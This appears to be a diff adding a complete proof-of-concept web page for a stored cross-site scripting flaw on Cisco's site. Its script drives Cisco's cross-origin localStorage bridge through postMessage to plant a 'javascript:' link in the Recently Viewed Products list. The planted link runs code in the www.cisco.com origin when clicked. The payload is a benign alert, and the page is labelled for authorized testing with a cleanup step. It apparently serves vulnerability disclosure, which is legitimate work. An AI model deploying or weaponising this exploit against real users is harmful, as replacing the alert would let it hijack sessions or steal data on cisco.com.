@@ -1,0 +1,145 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Cisco Recently Viewed Products XSS PoC</title>
+    <style>
+      body {
+        max-width: 760px;
+        margin: 3rem auto;
+        padding: 0 1.25rem;
+        color: #17202a;
+        font:
+          16px/1.55 system-ui,
+          sans-serif;
+      }
+      button,
+      a.button {
+        display: inline-block;
+        margin: 0.25rem 0.25rem 0.25rem 0;
+        padding: 0.7rem 1rem;
+        border: 1px solid #0b5cab;
+        border-radius: 0.35rem;
+        background: #0b5cab;
+        color: white;
+        font: inherit;
+        text-decoration: none;
+        cursor: pointer;
+      }
+      button.secondary {
+        background: white;
+        color: #0b5cab;
+      }
+      code,
+      pre {
+        background: #f2f4f7;
+      }
+      code {
+        padding: 0.1rem 0.3rem;
+      }
+      pre {
+        min-height: 3rem;
+        padding: 1rem;
+        white-space: pre-wrap;
+      }
+      .warning {
+        color: #9a3412;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>Cisco cross-origin localStorage XSS PoC</h1>
+    <p>
+      For authorized security testing only. This page writes a benign
+      <code>javascript:alert(document.domain)</code> entry to Cisco's Recently
+      Viewed Products list through the vulnerable cross-origin localStorage
+      bridge.
+    </p>
+    <p class="warning">
+      This temporarily replaces the browser's Cisco Recently Viewed Products
+      history. Use the cleanup button when finished.
+    </p>
+    <ol>
+      <li>Click <strong>Plant alert entry</strong> and allow the popup.</li>
+      <li>After the status says the entry was planted, open Cisco Support.</li>
+      <li>Under Recently Viewed Products, click the planted PoC entry.</li>
+      <li>The dialog should display <strong>www.cisco.com</strong>.</li>
+    </ol>
+    <p>
+      <button id="plant">1. Plant alert entry</button>
+      <a
+        class="button"
+        href="https://www.cisco.com/c/en/us/support/index.html"
+        target="_blank"
+        rel="noopener"
+      >
+        2. Open Cisco Support
+      </a>
+      <button class="secondary" id="cleanup">Remove PoC entry</button>
+    </p>
+    <pre id="status">Ready. Current origin: </pre>
+
+    <script>
+      const BRIDGE_URL = "https://www.cisco.com/assets/ctm/xdc/xdcLsFrame.html";
+      const KEY = "cdc-shp-visitedproductlinks";
+      const ENTRY = [
+        {
+          href: "javascript:window.__c22=document.domain;alert(document.domain)",
+          text: "Cisco Secure Firewall (PoC: click to show origin)",
+        },
+      ];
+      const status = document.getElementById("status");
+
+      function bridgeMessage(action) {
+        return JSON.stringify({
+          namespace: "cross-domain-local-message",
+          action,
+          id: 7,
+          key: KEY,
+          ...(action === "set" ? { value: JSON.stringify(ENTRY) } : {}),
+        });
+      }
+
+      function drive(action) {
+        const bridge = window.open(BRIDGE_URL, "cisco-xdc-poc");
+        if (!bridge) {
+          status.textContent =
+            "Popup blocked. Allow popups for this site and retry.";
+          return;
+        }
+
+        const payload = bridgeMessage(action);
+        let posts = 0;
+        const timer = setInterval(() => {
+          try {
+            bridge.postMessage(payload, "*");
+            posts += 1;
+            status.textContent = `${action}: sent ${posts} bridge messages`;
+          } catch (error) {
+            status.textContent = `Bridge error: ${error}`;
+          }
+        }, 500);
+
+        setTimeout(() => {
+          clearInterval(timer);
+          try {
+            bridge.close();
+          } catch (_) {}
+          status.textContent =
+            action === "set"
+              ? "Entry planted. Open Cisco Support and click the PoC Recently Viewed entry."
+              : "Cleanup sent. The PoC Recently Viewed storage key was removed.";
+        }, 6000);
+      }
+
+      status.textContent += location.origin;
+      document
+        .getElementById("plant")
+        .addEventListener("click", () => drive("set"));
+      document
+        .getElementById("cleanup")
+        .addEventListener("click", () => drive("remove"));
+    </script>
+  </body>
+</html>
